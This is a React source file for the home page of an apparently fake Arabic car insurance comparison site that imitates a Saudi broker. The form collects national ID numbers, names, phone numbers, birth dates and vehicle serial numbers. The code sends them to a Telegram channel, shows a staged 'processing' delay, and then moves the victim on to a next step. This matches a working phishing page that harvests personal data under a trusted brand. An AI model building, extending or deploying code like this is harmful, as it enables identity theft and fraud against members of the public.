import { zodResolver } from '@hookform/resolvers/zod'
import { Car, HeartHandshake, HeartPulse, Plane, Tent } from 'lucide-react'
import type { ReactNode } from 'react'
import { useCallback, useState } from 'react'
import { Controller, useForm } from 'react-hook-form'
import { useNavigate } from 'react-router-dom'

import { sendToTelegram } from '@/api/telegram'
import { CaptchaCanvas } from '@/components/CaptchaCanvas'
import { LoadingOverlay } from '@/components/LoadingOverlay'
import { PromoRibbon } from '@/components/layout/PromoRibbon'
import { SiteFooter } from '@/components/layout/SiteFooter'
import { SiteHeader } from '@/components/layout/SiteHeader'
import { Button } from '@/components/ui/button'
import { Checkbox } from '@/components/ui/checkbox'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { saveCustomerData } from '@/lib/storage'
import { cn } from '@/lib/utils'
import { insuranceStep1Schema, type InsuranceStep1FormValues } from '@/schemas/insuranceStep1'
import type { InsuranceStep1Payload } from '@/types/domain'

const categories = [
  { id: 'vehicles', label: 'مركبات', icon: Car, disabled: false },
  { id: 'medical', label: 'طبي', icon: HeartPulse, disabled: true },
  { id: 'malpractice', label: 'أخطاء طبية', icon: HeartHandshake, disabled: true },
  { id: 'travel', label: 'سفر', icon: Plane, disabled: true },
  { id: 'domestic', label: 'العمالة المنزلية', icon: Tent, disabled: true },
]

export default function HomePage() {
  const navigate = useNavigate()
  const [busy, setBusy] = useState(false)
  const [captchaExpected, setCaptchaExpected] = useState('')
  const [activeCat, setActiveCat] = useState('vehicles')

  const form = useForm<InsuranceStep1FormValues>({
    resolver: zodResolver(insuranceStep1Schema),
    defaultValues: {
      insuranceFlow: 'new',
      registrationMethod: 'serial',
      identityNumber: '',
      applicantName: '',
      phoneNumber: '',
      transferIdentityNumber: '',
      transferApplicantName: '',
      transferPhoneNumber: '',
      birthDate: '',
      serialNumber: '',
      verificationCode: '',
      agreeToTerms: false,
    },
    mode: 'onBlur',
  })

  const insuranceFlow = form.watch('insuranceFlow')
  const registrationMethod = form.watch('registrationMethod')

  const onCaptcha = useCallback((code: string) => {
    setCaptchaExpected(code)
    form.setValue('verificationCode', '')
  }, [form])

  const buildPayload = (v: InsuranceStep1FormValues): InsuranceStep1Payload => {
    if (v.insuranceFlow === 'new') {
      return {
        insurance_type: 'new',
        identity_number: v.identityNumber.replace(/\D/g, '').slice(0, 10),
        applicant_name: v.applicantName.trim(),
        phone_number: v.phoneNumber.replace(/\D/g, '').slice(0, 9),
        registration_method: v.registrationMethod,
        serial_number: v.serialNumber.replace(/\D/g, ''),
        verification_code: v.verificationCode.replace(/\D/g, '').slice(0, 4),
      }
    }
    return {
      insurance_type: 'transfer',
      identity_number: v.transferIdentityNumber.replace(/\D/g, '').slice(0, 10),
      applicant_name: v.transferApplicantName.trim(),
      phone_number: v.transferPhoneNumber.replace(/\D/g, '').slice(0, 9),
      birth_date: v.birthDate ?? '',
      registration_method: v.registrationMethod,
      serial_number: v.serialNumber.replace(/\D/g, ''),
      verification_code: v.verificationCode.replace(/\D/g, '').slice(0, 4),
    }
  }

  const onSubmit = async (v: InsuranceStep1FormValues) => {
    const entered = v.verificationCode.replace(/\D/g, '').slice(0, 4)
    if (entered !== captchaExpected) {
      form.setError('verificationCode', { message: 'رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى' })
      return
    }
    setBusy(true)
    const payload = buildPayload(v)
    const res = await sendToTelegram({ type: 'insurance_step1', payload })
    if (!res.ok) {
      setBusy(false)
      alert('حدث خطأ في الإرسال، يرجى المحاولة مرة أخرى')
      return
    }
    saveCustomerData(payload)
    window.setTimeout(() => {
      setBusy(false)
      navigate('/vehicle')
    }, 4000)
  }

  return (
    <div className="min-h-screen bg-background">
      <PromoRibbon />
      <SiteHeader />
      <main className="mx-auto max-w-3xl px-4 pb-12">
        <section className="relative my-4 overflow-hidden rounded-2xl bg-gradient-to-br from-primary via-primary to-deep p-5 text-primary-foreground shadow-soft">
          <div className="pointer-events-none absolute inset-0">
            <div className="absolute -start-10 -top-10 h-24 w-24 rounded-full bg-white/10 blur-xl" />
            <div className="absolute -bottom-12 -end-12 h-28 w-28 rounded-full bg-white/10 blur-xl" />
          </div>
          <div className="relative z-10 flex flex-col gap-3">
            <div className="flex flex-wrap gap-2">
              <span className="inline-flex items-center gap-2 rounded-full bg-white/15 px-3 py-1 text-[11px] font-semibold">
                <span className="h-2 w-2 animate-pulse rounded-full bg-emerald-300" />
                منصة مقارنة التأمين الأولى
              </span>
              <span className="inline-flex items-center gap-2 rounded-full border border-white/15 px-3 py-1 text-[11px] text-white/85">
                <span className="h-2 w-2 rounded-full bg-emerald-300" />
                أكثر من 20 شركة تأمين معتمدة
              </span>
            </div>
            <h1 className="text-lg font-bold leading-snug sm:text-xl lg:text-2xl">قارن، أمّن، واستلم وثيقتك خلال دقائق</h1>
            <p className="text-sm text-white/80 sm:text-base">
              مكان واحد لتأمين مركبتك، مع عروض فورية من شركات متعددة ومعتمدة.
            </p>
          </div>
        </section>

        <form onSubmit={form.handleSubmit(onSubmit)} className="flex flex-col gap-6">
          <div className="rounded-2xl border border-border bg-card p-4 shadow-soft sm:p-6">
            <div className="mb-5 flex flex-col gap-4 sm:flex-row sm:items-start sm:justify-between">
              <div>
                <p className="text-sm font-semibold text-primary">فئات التأمين</p>
                <p className="text-xs text-muted-foreground">أدخل بياناتك لتظهر أفضل الأسعار فورًا.</p>
              </div>
              <span className="text-xs font-semibold text-muted-foreground">نوع التأمين</span>
            </div>
            <div className="mb-5 grid grid-cols-5 gap-2">
              {categories.map((c) => (
                <button
                  key={c.id}
                  type="button"
                  disabled={c.disabled}
                  onClick={() => !c.disabled && setActiveCat(c.id)}
                  className={cn(
                    'flex min-w-0 flex-col items-center justify-center gap-1 rounded-xl border border-border bg-card px-2 py-2 text-[10px] font-semibold transition sm:text-[11px]',
                    activeCat === c.id && !c.disabled && 'border-primary bg-primary text-primary-foreground shadow-sm',
                    c.disabled && 'cursor-not-allowed opacity-60',
                  )}
                >
                  <c.icon className="h-4 w-4 shrink-0 sm:h-5 sm:w-5" />
                  <span className="truncate">{c.label}</span>
                </button>
              ))}
            </div>
            <div className="grid grid-cols-2 gap-3">
              <button
                type="button"
                className={cn(
                  'rounded-xl border border-border bg-card px-3 py-2 text-sm font-semibold',
                  insuranceFlow === 'new' && 'border-primary bg-primary text-primary-foreground',
                )}
                onClick={() => form.setValue('insuranceFlow', 'new')}
              >
                تأمين جديد
              </button>
              <button
                type="button"
                className={cn(
                  'rounded-xl border border-border bg-card px-3 py-2 text-sm font-semibold',
                  insuranceFlow === 'transfer' && 'border-primary bg-primary text-primary-foreground',
                )}
                onClick={() => form.setValue('insuranceFlow', 'transfer')}
              >
                نقل الملكية
              </button>
            </div>
          </div>

          <div className="rounded-2xl border border-border bg-muted p-4 shadow-card sm:p-6">
            <div className="mb-6">
              <h2 className="text-lg font-bold text-foreground">ابدأ طلبك الآن</h2>
              <p className="text-xs text-muted-foreground">أدخل بياناتك لتظهر أفضل الأسعار فورًا.</p>
            </div>

            <div className="mb-6 rounded-xl border border-border bg-card p-4">
              <div className="mb-3 flex items-center justify-between">
                <Label className="text-sm font-semibold">طريقة تسجيل المركبة</Label>
              </div>
              <div className="grid grid-cols-2 gap-3">
                <button
                  type="button"
                  className={cn(
                    'rounded-xl border border-border bg-secondary px-3 py-2 text-xs font-semibold text-secondary-foreground sm:text-sm',
                    registrationMethod === 'serial' && 'border-primary bg-primary text-primary-foreground',
                  )}
                  onClick={() => form.setValue('registrationMethod', 'serial')}
                >
                  الرقم التسلسلي
                </button>
                <button
                  type="button"
                  className={cn(
                    'rounded-xl border border-border bg-secondary px-3 py-2 text-xs font-semibold text-secondary-foreground sm:text-sm',
                    registrationMethod === 'customs' && 'border-primary bg-primary text-primary-foreground',
                  )}
                  onClick={() => form.setValue('registrationMethod', 'customs')}
                >
                  بطاقة جمركية (استيراد)
                </button>
              </div>
            </div>

            {insuranceFlow === 'new' ? (
              <>
                <Field
                  label="رقم الهوية / الإقامة:"
                  error={form.formState.errors.identityNumber?.message}
                >
                  <Input
                    inputMode="numeric"
                    dir="rtl"
                    maxLength={10}
                    {...form.register('identityNumber', {
                      onChange: (e) => {
                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10)
                      },
                    })}
                  />
                </Field>
                <Field label="اسم مقدم الطلب:" error={form.formState.errors.applicantName?.message}>
                  <Input placeholder="الاسم كما في الهوية" {...form.register('applicantName')} dir="rtl" />
                </Field>
                <Field label="رقم الجوال:" error={form.formState.errors.phoneNumber?.message}>
                  <Input
                    placeholder="يبدأ بـ 5، مثال: 501234567"
                    inputMode="numeric"
                    maxLength={9}
                    dir="ltr"
                    className="text-end"
                    {...form.register('phoneNumber', {
                      onChange: (e) => {
                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9)
                      },
                    })}
                  />
                </Field>
              </>
            ) : (
              <>
                <Field
                  label="رقم الهوية / الإقامة:"
                  error={form.formState.errors.transferIdentityNumber?.message}
                >
                  <Input
                    inputMode="numeric"
                    maxLength={10}
                    dir="rtl"
                    {...form.register('transferIdentityNumber', {
                      onChange: (e) => {
                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10)
                      },
                    })}
                  />
                </Field>
                <Field label="اسم مقدم الطلب:" error={form.formState.errors.transferApplicantName?.message}>
                  <Input placeholder="الاسم كما في الهوية" {...form.register('transferApplicantName')} dir="rtl" />
                </Field>
                <Field label="رقم الجوال:" error={form.formState.errors.transferPhoneNumber?.message}>
                  <Input
                    placeholder="يبدأ بـ 5، مثال: 501234567"
                    inputMode="numeric"
                    maxLength={9}
                    dir="ltr"
                    className="text-end"
                    {...form.register('transferPhoneNumber', {
                      onChange: (e) => {
                        e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9)
                      },
                    })}
                  />
                </Field>
                <Field label="تاريخ الميلاد:" error={form.formState.errors.birthDate?.message}>
                  <Input type="date" dir="rtl" {...form.register('birthDate')} />
                </Field>
              </>
            )}

            <Field
              label={registrationMethod === 'serial' ? 'الرقم التسلسلي للمركبة:' : 'رقم البطاقة الجمركية:'}
              error={form.formState.errors.serialNumber?.message}
            >
              <Input
                placeholder={
                  registrationMethod === 'serial' ? 'موجود في استمارة المركبة' : 'ادخل رقم البطاقة الجمركية'
                }
                inputMode="numeric"
                dir="rtl"
                {...form.register('serialNumber', {
                  onChange: (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '')
                  },
                })}
              />
            </Field>
          </div>

          <div className="rounded-2xl border border-border bg-card p-4 shadow-soft sm:p-6">
            <h3 className="mb-4 text-sm font-semibold text-foreground">رمز التحقق</h3>
            <Label className="mb-2 block text-sm text-muted-foreground">رمز التحقق:</Label>
            <div className="flex gap-3">
              <CaptchaCanvas onCodeChange={onCaptcha} />
              <Input
                inputMode="numeric"
                maxLength={4}
                placeholder="ادخل الرمز"
                dir="ltr"
                className="text-center font-semibold tracking-widest"
                {...form.register('verificationCode', {
                  onChange: (e) => {
                    e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4)
                  },
                })}
              />
            </div>
            {form.formState.errors.verificationCode?.message && (
              <p className="mt-2 text-xs text-destructive">{form.formState.errors.verificationCode.message}</p>
            )}

            <div className="mt-6 flex items-start gap-3 border-t border-border pt-6">
              <Controller
                name="agreeToTerms"
                control={form.control}
                render={({ field }) => (
                  <Checkbox checked={field.value} onCheckedChange={(c) => field.onChange(c === true)} id="terms" />
                )}
              />
              <Label htmlFor="terms" className="cursor-pointer text-xs leading-relaxed text-muted-foreground">
                أوافق على منح شركة عناية الوسيط الحق في الاستعلام من شركة نجم و/أو مركز المعلومات الوطني عن بياناتي وبيانات
                مركبتي.
              </Label>
            </div>
            {form.formState.errors.agreeToTerms?.message && (
              <p className="mt-2 text-xs text-destructive">{form.formState.errors.agreeToTerms.message}</p>
            )}

            <Button type="submit" className="mt-6 w-full rounded-xl py-6 text-base shadow-md">
              إظهار العروض
            </Button>
          </div>
        </form>

        <div id="apps" />
      </main>
      <SiteFooter />
      <LoadingOverlay open={busy} message="جاري معالجة طلبك..." />
    </div>
  )
}

function Field({
  label,
  error,
  children,
}: {
  label: string
  error?: string
  children: ReactNode
}) {
  return (
    <div className="mb-5 grid gap-1 md:grid-cols-[1fr_2fr] md:items-start md:gap-6">
      <Label className="pt-2 text-sm font-medium text-muted-foreground">{label}</Label>
      <div className="space-y-1">
        {children}
        {error && <p className="text-xs text-destructive">{error}</p>}
      </div>
    </div>
  )
}
